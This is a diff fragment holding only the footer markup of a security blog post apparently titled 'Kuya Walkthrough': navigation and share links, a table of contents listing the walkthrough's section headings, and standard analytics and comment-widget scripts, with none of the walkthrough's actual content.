+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steganography"><span class="toc-number">1.2.</span> <span class="toc-text">Steganography</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capturing-the-packets"><span class="toc-number">1.3.</span> <span class="toc-text">Capturing the packets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-the-7z-archive"><span class="toc-number">1.4.</span> <span class="toc-text">Cracking the 7z archive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-the-SSH-keys"><span class="toc-number">1.5.</span> <span class="toc-text">Getting the SSH keys</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-access"><span class="toc-number">1.6.</span> <span class="toc-text">Gaining access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-escalation"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reading-files-as-root"><span class="toc-number">1.8.</span> <span class="toc-text">Reading files as root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-the-shadow-file"><span class="toc-number">1.8.1.</span> <span class="toc-text">Reading the shadow file</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-root-directory"><span class="toc-number">1.9.</span> <span class="toc-text">The root directory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Root-shell"><span class="toc-number">1.9.1.</span> <span class="toc-text">Root shell?!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">1.10.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/&text=Kuya Walkthrough"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/&title=Kuya Walkthrough"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Kuya Walkthrough&body=Check out this article: https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/&title=Kuya Walkthrough"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <!--<a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>-->
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Kristof Toth
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-131012780-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'infosecadventures';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
